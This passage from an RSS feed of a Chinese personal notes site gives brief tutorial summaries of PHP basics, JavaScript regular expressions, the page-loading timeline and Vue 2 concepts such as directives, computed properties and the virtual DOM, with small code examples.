{{.}} 表示枚举，可以循环输出整个数组。
{{!comments}} 表示注释
{{&amp;gt;partials}} 以&amp;gt;开始表示子模块，当结构比较复杂时，我们可以使用该语法将复杂的结构拆分成几个小的子模块。</description>
    </item>
    
    <item>
      <title>PHP 判断数据类型</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid>
      <description>判断变量类型 is_XX() 判断一个变量是否为指定数据类型，最终返回这个变量所保存数据的数据类型。
Bool 类型不能用 echo 来查看，需要使用 var_dump() 查看。
// true var_dump(is_int($a)); echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;;  // false var_dump(is_int($b)); echo &amp;#39;&amp;lt;hr/&amp;gt;&amp;#39;; gettype() 获取变量的类型，得到的是该类型对应的字符串。
// string echo &amp;#39;a 的数据类型为：&amp;#39; . gettype($a); echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; // integer echo &amp;#39;b 的数据类型为：&amp;#39; . gettype($b);  echo &amp;#39;&amp;lt;hr/&amp;gt;&amp;#39;; </description>
    </item>
    
    <item>
      <title>PHP 数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84/</guid>
      <description>数组 索引数组 用数字作为键名的数组一般叫做索引数组。用字符串表示键的数组就是下面要介绍的关联数组。索引数组的键是整数，而且从 0 开始以此类推。
关联数组 数组的key是字符串。
特点   可以使用整数或字符串作为下标。
  下标为整数则为索引数组。
  下标都为字符串，则为关联数组。
    不同的下标（字符串、整数）可以混合存在，则为混合数组。
  数组中元素的顺序以放入顺序为准，与指定的下标无关。
  特殊的下标自动转换：false、true、null。
  </description>
    </item>
    
    <item>
      <title>PHP 文件包含</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</guid>
      <description>文件包含 在一个 PHP 脚本中，将另一个文件的代码插入到当前文件，并使用另一个文件中的方法、变量等等。
用于实现代码模块化。
被包含的文件是单独进行编译的
包含方式 include() 一般放在程序的流程控制中，当程序执行时碰到才会引用，简化程序的执行流程。
include()引入的文件有错误时，会继续执行，并返回一个警告。
include once() 检查当前文件是否已经在前面被引入过了，如果已经引入过，则不在引入。
可以避免某写代码重新执行而报错，比如重复引入导致常量重复定义。
require() 一般放在 PHP 文件的最前面，程序在执行前就会先导入要引用的文件。
require()引入的文件有错误时，执行会中断，并返回一个致命错误。
require onec() 检查当前文件是否已经在前面被引入过了，如果已经引入过，则不在引入。
可以避免某写代码重新执行而报错，比如重复引入导致常量重复定义。</description>
    </item>
    
    <item>
      <title>PHP 流程控制代替语法</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%BB%A3%E6%9B%BF%E8%AF%AD%E6%B3%95/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%BB%A3%E6%9B%BF%E8%AF%AD%E6%B3%95/</guid>
      <description>流程控制代替语法 代替 for PHP 本身是嵌入到 HTML 中的脚本语言，因此，我们可以这样书写：
// 生成了九个一级标题元素。 &amp;lt;?php for ($i = 1; $i &amp;lt; 10; $i++) { ?&amp;gt;&amp;lt;h1&amp;gt;一级标题&amp;lt;/h1&amp;gt; &amp;lt;?php } ?&amp;gt; 但是，如果我们以上面这种方式将 PHP 代码嵌入到 HTML 中，那么{}给我们所带来的观感是非常不好的。
因此， PHP 提供了一种代替{}的机制：
&amp;lt;?php for ($i = 1; $i &amp;lt; 10; $i++) : ?&amp;gt;&amp;lt;h1&amp;gt;一级标题&amp;lt;/h1&amp;gt; &amp;lt;?php endfor; ?&amp;gt; 同样的，除了for，PHP 还支持 if、switch、while、foreach：
&amp;lt;?php if (1 &amp;lt; 2) : ?&amp;gt;&amp;lt;h1&amp;gt;一级标题&amp;lt;/h1&amp;gt; &amp;lt;?php endif; ?&amp;gt; </description>
    </item>
    
    <item>
      <title>PHP 运算符</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E8%BF%90%E7%AE%97%E7%AC%A6/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E8%BF%90%E7%AE%97%E7%AC%A6/</guid>
      <description>运算符 错误抑制符 在 PHP 中 有一些错误可以提前预知，但是这些错误可能无法避免，但又不希望报错给用户看，可以使用错误抑制符@()处理。
&amp;lt;?php $a = 10; $b = 0; @($c = $a / $b);  echo $c; 错误抑制符通常在生产环境（上线）会用到，在开发的时候不会用系统本身最好没有任何。</description>
    </item>
    
    <item>
      <title>RegExp 属性</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/regexp-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/regexp-%E5%B1%9E%E6%80%A7/</guid>
      <description>RegExp 属性 lastIndex 从 0 开始，表示字符在进行下一次匹配时的起始位置，这个属性会被exec()和test()用到。
该属性可以被手动修改。
var reg = /ab/g;  var str = &amp;#39;abababab&amp;#39;;  // 第一次匹配，lastIndex 变为 2 console.log(reg.exec(str)); // lastIndex = 2 console.log(reg.lastIndex); //手动修改 lastIndex reg.lastIndex = 0; // 修改成功，lastIndex = 2 console.log(reg.exec(str)); </description>
    </item>
    
    <item>
      <title>RegExp 量词</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E9%87%8F%E8%AF%8D/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E9%87%8F%E8%AF%8D/</guid>
      <description>量词 表示数量。
n+ 匹配 n 一次或多次，等价于 {1,}。
var reg = /a+/g;  var str = &amp;#39;aavva&amp;#39;;  var result = str.match(reg); console.log(result); n* 匹配 n 零次或多次。等价于{0,}。
var reg = /a*/g;  var str = &amp;#39;aavva&amp;#39;;  var result = str.match(reg); console.log(result); n? 匹配 n 零次或一次。等价于 {0,1}。
var reg = /a?/g;  var str = &amp;#39;aavva&amp;#39;;  var result = str.match(reg); console.log(result); n{x} 匹配 n 表达式 x 次。x 是一个非负整数。
var reg = /o{2}/g;  var str = &amp;#39;boooody&amp;#39;;  var result = str.</description>
    </item>
    
    <item>
      <title>Vue computd</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/computd/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/computd/</guid>
      <description>computd 通过已有的属性计算出来的属性。
计算属性最终会出现在 Vue 实例上，直接调用即可。
如果计算属性有可能被修改，那必须写set()去响应修改，且要引起计算属性所依赖的属性发生变化。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;p&amp;gt;姓：{{ firstName }}&amp;lt;/p&amp;gt; 	&amp;lt;p&amp;gt;名：{{ lastName }}&amp;lt;/p&amp;gt; 	&amp;lt;p&amp;gt;全名：{{ fullName }}&amp;lt;/p&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	text: &amp;#39;表单&amp;#39;, 	firstName: &amp;#39;苏&amp;#39;, 	lastName: &amp;#39;明敏&amp;#39;, 	}, 	computed: { 	fullName: { 	get() { 	return this.firstName + &amp;#39;-&amp;#39; + this.lastName; 	}, 	set(value) { 	var arr = value.</description>
    </item>
    
    <item>
      <title>Vue key</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7/key/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7/key/</guid>
      <description>key 表示节点的唯一标识key。
使用 v-for 时，如果不给元素加上 key，那么 Vue 会默认将 index当作元素的key。
该属性可以干预diff 算法，在同一层级，key值相同的节点会进行比对，key值不同的节点则不会比对。
在循环生成的节点中，vue 强烈建议给予每个节点唯一且稳定的 key 值。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;div v-if=&amp;#34;handoff === &amp;#39;login&amp;#39;&amp;#34;&amp;gt; &amp;lt;label&amp;gt;登录&amp;lt;/label&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; key=&amp;#34;1&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div v-else&amp;gt; &amp;lt;label&amp;gt;注册&amp;lt;/label&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; key=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div&amp;gt; &amp;lt;!-- handoff 等于：如果 login 为 true，则 handoff === register，否则 handoff === login --&amp;gt; &amp;lt;button @click=&amp;#34;handoff = handoff === &amp;#39;login&amp;#39;?&amp;#39;register&amp;#39;:&amp;#39;login&amp;#39;&amp;#34;&amp;gt;切换&amp;lt;/button&amp;gt;  &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	text: &amp;#39;表单&amp;#39;, 	handoff: &amp;#39;login&amp;#39;, 	}, }); Vue.</description>
    </item>
    
    <item>
      <title>Vue ref</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7/ref/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%89%B9%E6%AE%8A%E5%B1%9E%E6%80%A7/ref/</guid>
      <description>ref 用于给元素或子组件注册唯一标识，这个唯一标识将会被注册到父组件的 $refs 对象上。
对于 HTML 元素，获取的是 DOM 元素，与 id 是一样的；对于组件，获取的是组件实例对象。
$refs 不是响应式的属性。</description>
    </item>
    
    <item>
      <title>Vue v-for</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/v-for/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/v-for/</guid>
      <description>v-for 循环渲染元素。
当和 v-if 一起使用时，v-for 的优先级比 v-if 更高。
可以用 of 替代 in 作为分隔符，因为它更接近 JavaScript 迭代器的语法。
不要使用对象或数组之类的非基本类型值作为 v-for 的 key。请用字符串或数值类型的值。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; 	&amp;lt;ul&amp;gt; 	&amp;lt;li v-for=&amp;#34;(p,index) in persons&amp;#34; :key=&amp;#34;index&amp;#34;&amp;gt;{{p.name}} and {{p.age}}&amp;lt;/li&amp;gt; 	&amp;lt;/ul&amp;gt;  	&amp;lt;ul&amp;gt; 	&amp;lt;li v-for=&amp;#34;(f,index) in fruits&amp;#34; :key=&amp;#34;index&amp;#34;&amp;gt;{{f}}&amp;lt;/li&amp;gt; 	&amp;lt;/ul&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	// 遍历数组 	persons: [ 	{ id: &amp;#39;001&amp;#39;, name: &amp;#39;小明&amp;#39;, age: 9 }, 	{ id: &amp;#39;002&amp;#39;, name: &amp;#39;小苏&amp;#39;, age: 21 }, 	{ id: &amp;#39;003&amp;#39;, name: &amp;#39;小朱 &amp;#39;, age: 20 }, 	], 	// 遍历对象 	fruits: { 	name: &amp;#39;banana&amp;#39;, 	color: &amp;#39;yellow&amp;#39;, 	kg: &amp;#39;3kg&amp;#39;, 	}, 	}, });  Vue.</description>
    </item>
    
    <item>
      <title>Vue v-if</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-if/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-if/</guid>
      <description>v-if 控制元素是否存在。
如果多个 if 指令：v-if、v-else、v-else-if连用，则使用它们的元素必须紧挨。
在 &amp;lt;template&amp;gt; 元素上使用 v-if 时，最终的渲染结果将不包含 &amp;lt;template&amp;gt; 元素。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;!-- 如果 isShow 为 true，则插入 img，如果 isShow 为 false，则移除 img --&amp;gt;  &amp;lt;img v-if=&amp;#34;isShow&amp;#34; :src=&amp;#34;url&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt; &amp;lt;!-- 否则（img 已移除），则显示 button 元素，如果 img 已插入，则移除 button--&amp;gt; &amp;lt;button v-else=&amp;#34;!isShow&amp;#34;&amp;gt;切换&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScript
var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	url: &amp;#39;https://img1.baidu.com/it/u=999074466,1525171260&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=138&amp;amp;f=JPEG?w=500&amp;amp;h=333&amp;#39;, 	}, }); Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue v-on</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-on/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-on/</guid>
      <description>v-on 注册一个事件，可简写为@。
支持一些指令修饰符，比如 prevent。
事件函数必须存在于methods中，事件参数为event。
&amp;lt;!-- 完整语法 --&amp;gt; &amp;lt;a v-on:click=&amp;#34;doSomething&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt;  &amp;lt;!-- 缩写 --&amp;gt; &amp;lt;a @click=&amp;#34;doSomething&amp;#34;&amp;gt;...&amp;lt;/a&amp;gt; 调用事件函数时
 不加括号，调用事件函数就可以直接获取到该函数的事件对象。 加了 ()， 除了可以使用$event来获取事件对象，还能传入其他的参数。  &amp;lt;div id=&amp;#34;root&amp;#34;&amp;gt;  &amp;lt;button @click=&amp;#39;showInfo&amp;#39;&amp;gt;提示信息&amp;lt;/button&amp;gt;  &amp;lt;button @click=&amp;#39;showInfo2($event,6666)&amp;#39;&amp;gt;提示信息&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue v-show</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-show/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/v-show/</guid>
      <description>v-show 控制元素是否可见，如果元素不可见，则该元素display:none。
HTML &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;img v-show=&amp;#34;isShow&amp;#34; :src=&amp;#34;url&amp;#34; alt=&amp;#34;&amp;#34;&amp;gt; &amp;lt;button @click=&amp;#34;isShow = !isShow&amp;#34;&amp;gt;切换&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScript var app = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { url: &amp;#39;https://img1.baidu.com/it/u=999074466,1525171260&amp;amp;fm=253&amp;amp;fmt=auto&amp;amp;app=138&amp;amp;f=JPEG?w=500&amp;amp;h=333&amp;#39; }, }); Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue 挂载</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E6%8C%82%E8%BD%BD/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E6%8C%82%E8%BD%BD/</guid>
      <description>挂载 将生成的真实 DOM 树，插入到页面上的过程，称之为挂载。
挂载方式 通过el:&#39;CSS 选择器&#39;来挂载。
new Vue({ 	// vue 代码 }).$mount(&amp;#39;#app&amp;#39;); 通过Vue 实例.$mount(&#39;CSS 选择器&#39;)进行稍后挂载。
// 或者 var v = Vue({ 	// vue 代码 }); v.$mount(&amp;#39;#app&amp;#39;); </description>
    </item>
    
    <item>
      <title>Vue 指令</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4/</guid>
      <description>指令 用于解析元素（属性、内存、事件等），比如使用v-binds:url来进行解析，使得该属性成为动态属性。其中 url必须是 JavaScrip 表达式，也可以直接读取 data 中的数据。
Vue 中的指令始终以v-开头。</description>
    </item>
    
    <item>
      <title>Vue 指令修饰符</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4%E4%BF%AE%E9%A5%B0%E7%AC%A6/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E6%8C%87%E4%BB%A4%E4%BF%AE%E9%A5%B0%E7%AC%A6/</guid>
      <description>指令修饰符 prevent 阻止元素默认行为，比如 a 元素的跳转。
指令修饰符可以连写，先阻止元素默认行为，再阻止元素冒泡。
&amp;lt;a @click.prevent.stop=&amp;#34;btn&amp;#34; href=&amp;#34;https://ke.qq.com/&amp;#34;&amp;gt;123&amp;lt;/a&amp;gt; stop 阻止元素的事件冒泡。
once 事件只触发一次
capture 使用事件的捕获模式
self 只有 event.target 是当前操作的元素时，才触发该事件
&amp;lt;div id=&amp;#34;root&amp;#34;&amp;gt;  &amp;lt;!--因为触发事件冒泡 target 不是 div，而是 button--&amp;gt;  &amp;lt;!--所以点击 button 不会触发事件冒泡--&amp;gt;  &amp;lt;div @click.self=&amp;#39;showInfo2&amp;#39;&amp;gt;  &amp;lt;button @click=&amp;#39;showInfo&amp;#39;&amp;gt;提示信息&amp;lt;/button&amp;gt;  &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; passive 事件的默认行为立即执行，无需等待事件的回调执行完毕</description>
    </item>
    
    <item>
      <title>Vue 注入</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%B3%A8%E5%85%A5/</guid>
      <description>注入 配置的实例对象中的部分内容会被提取到 Vue 实例中：
 data:{} methods: {}  该过程称之为注入，注入的目的有两个：
完成数据响应式 Vue 是如何知道数据被更改的？
vue 2.0，是通过object.defineProperty()完成的数据响应式。该方法有很多缺陷，比如我们新增或删除data中的属性，此时的页面会无法正常响应。
vue 3.0，是通过 Class proxy。
绑定 this 通过 bind()来改变 this 的指向。</description>
    </item>
    
    <item>
      <title>Vue 组件化</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E5%8C%96/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E5%8C%96/</guid>
      <description>组件化 将页面按照功能细分为若干个区域，每一个区域就是一个组件，每个组件包含：
 功能（JS） 内容（模板） 样式（CSS）  作用 复用编码、简化项目编码、提高运行效率。</description>
    </item>
    
    <item>
      <title>Vue 虚拟 DOM 树</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E8%99%9A%E6%8B%9F-dom-%E6%A0%91/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E8%99%9A%E6%8B%9F-dom-%E6%A0%91/</guid>
      <description>虚拟 DOM 树 它是一个普通的对象，对应着真实的 DOM 树；虚拟 DOM 树的节点都是虚拟的节点。
为了提高效率，vue 会把模板编译成为虚拟 DOM 树，然后生成真实 DOM 树。
因为浏览器如果直接修改真实的 DOM 树，这是非常影响效率的，但如果修改一个对象，那么效率是非常高的。
有什么用 当数据更改时，会将更改后的内容编译成一棵新的虚拟 DOM 树，然后将其与旧的虚拟 DOM 树比对（diff算法），仅将两棵虚拟 DOM 属有差异的节点渲染为真实 DOM 树，没有差异的节点则直接使用旧虚拟 DOM 树所对应的真实 DOM 树上的节点（复用）。这样可最小程度的改动真实 DOM，提升页面渲染效率。
因此，对于 Vue 而言，提升效率重点在于两个方面：
  减少新的虚拟 DOM 的生成。
  保证虚拟 DOM 树对比之后，只有必要的节点发生变化。
  如何生成虚拟 DOM 树 生成虚拟 DOM 树的方式：
 在挂载的元素内部直接书写，此时使用元素的outerHTML作为模板。优先级最低。 在template配置中书写,，它是一个模板字符串。优先级比第一种方式高。 在render()中直接创建虚拟节点树，此时，完全脱离模板（无需模板解析器代码），这会省略将模板编译为虚拟 DOM 树的步骤。优先级最高。  当我们将 Vue 编译为浏览器可识别的 HTML 代码的时候，此时已无需使用模板解析器，因此，我们可以直接引入只有 Vue 核心代码（不包含模板解析器代码，无法使用template配置项）的vue.runtime.xxx.js，来精简我们的项目。    使用render()循环创建 1—6 级标题：</description>
    </item>
    
    <item>
      <title>VueComponent</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/vuecomponent/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/vuecomponent/</guid>
      <description>VueComponent   一个组件的本质是一个名为VueComponent()的构造函数， 且不是程序员定义的，是Vue. extend()生成的。
  我们只需要应用某个组件，像这样&amp;lt;school&amp;gt;&amp;lt;/school&amp;gt;，Vue 解析时会帮我们创建这个school组件的实例对象，即 Vue 内部会执行：new VueComponent(options).
  每次调用 Vue.extend()时，都会重新定义一个全新的VueComponent()。此，每次调用Vue.extend()时，返回的都是一个全新的VueComponent()，
  关于 this 的指向：
 在 Vue 实例中，data、methods、watch、computed 配置中的普通函数，其 this 指向都是 Vue 实例对象。 在组件实例中，data、methods、watch、computed 配置中的普通函数，其 this 指向都是VueComponent 实例对象。    Vue 实例简称vm、组件实例简称 vc。
  $children属性表示了当前实例（Vue 实例和组件实例）上的子实例。
  </description>
    </item>
    
    <item>
      <title>JavaScrip 时间线</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%97%B6%E9%97%B4%E7%BA%BF/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%97%B6%E9%97%B4%E7%BA%BF/</guid>
      <description>时间线 浏览器加载一个页面时，当开始执行 JavaScrip 的那一刻，浏览器会有一个特定的加载顺序，按照这个加载顺序一步步的执行的过程，就会形成一个时间线。
顺序 大致就三步：创建 Document ——&amp;gt; DOMTree 解析完毕，文档加载完毕并执行完毕。
 创建 Document 对象，开始解析 Web 页面。 解析 HTML 元素和它们的文本内容后添加 Element 对象和 Text 节点到文档中。此时的document.readyState = &#39;loading&#39;。 如遇到 link 引入的外部 CSS，那么创建线程加载这个 CSS，并继续解析文档。 遇到 script 引入的外部 JS，并且没有设置异步 async、defer 等，浏览器则同步加载这个 JS 文件，并阻塞，等待 JS 加载完成并执行该脚本，然后继续解析文档。 遇到 script 引入的外部 JS，井且设置有异步 async、defer 等，浏览器创建异步线程加载，井继续解析文档。对于 async 属性的脚本，脚本加载完成后立即执行。(异步加载的 JS 文件，其中禁止使用 document.write()) 遇到 img 等有 src 属性的元素，先正常解析 DOM 结构，然后浏览器异步加载 src，并继续解析文档。 当文档（DOMTree）解析完成，此时的document.readyState = &#39;interactive&#39;。 文档解析完成后，所有设置有 defer 的脚本会按照顺序执行。（注意与 async 的不同,但同样禁止使用 document.write()） document 对象触发 DOMContentLoaded 事件，这也标志着程序执行从同步脚本执行阶段，转化为事件驱动阶段。 当所有 async 的脚本加载完成并执行完毕后、img 等加载完成后，document.</description>
    </item>
    
    <item>
      <title>RegExp</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</guid>
      <description>RegExp 一种查找以及字符串替换的操作。
直接量（推荐使用） var reg = /abcde/i;  var str = &amp;#39;abCDE&amp;#39;;  var result = reg.test(str); console.log(result); new RegExp var str = &amp;#39;abCDE&amp;#39;; var reg = new RegExp(&amp;#39;abc&amp;#39;, &amp;#39;i&amp;#39;); var result = reg.test(str); console.log(result); 贪婪匹配 匹配时，能多匹配，就不会少匹配。
正则表达式默认的匹配模式就是贪婪匹配。
非贪婪匹配 匹配时，能少匹配，就不会多匹配。
+? 重复 1 次或更多次，但尽可能少重复。
var str = &amp;#39;aaaa&amp;#39;; var reg = /a+?/g; var result = str.match(reg); console.log(result); 除了+?，还有：
*? 重复任意次，但尽可能少重复。
?? 重复 0 次或 1 次，但尽可能少重复。
{n,m}? 重复 n 到 m 次，但尽可能少重复。</description>
    </item>
    
    <item>
      <title>RegExp 修饰符</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E4%BF%AE%E9%A5%B0%E7%AC%A6/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E4%BF%AE%E9%A5%B0%E7%AC%A6/</guid>
      <description>修饰符 i 不区分大小写，即 A 和 a 没有区别。
var reg = /abcde/i;  var str = &amp;#39;abCDE&amp;#39;;  var result = reg.test(str); console.log(result); g 全局匹配。查找字符串中所有的匹配项。
即匹配到一个匹配项后，还会继续匹配后续的字符串，它找出字符串中所有的匹配项。
var reg = /ab/g; var str = &amp;#39;abababababab&amp;#39;;  var result = str.match(reg); console.log(result); 如果不加该修饰符，则只匹配一个匹配项：
var reg = /ab/; var str = &amp;#39;abababababab&amp;#39;;  var result = str.match(reg); console.log(result); m 多行匹配，通常需要配合g来用。用边界字符^表示只匹配每一行的开头，用$匹配每一行的结尾，注意时是多行匹配，而不是整个字符串的开头和结尾。
var reg = /^a/gm;  var str = &amp;#39;abcababa\nabab&amp;#39;;  var result = str.match(reg); console.</description>
    </item>
    
    <item>
      <title>RegExp 元字符</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E5%85%83%E5%AD%97%E7%AC%A6/</link>
      <pubDate>Mon, 09 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/regexp/%E5%85%83%E5%AD%97%E7%AC%A6/</guid>
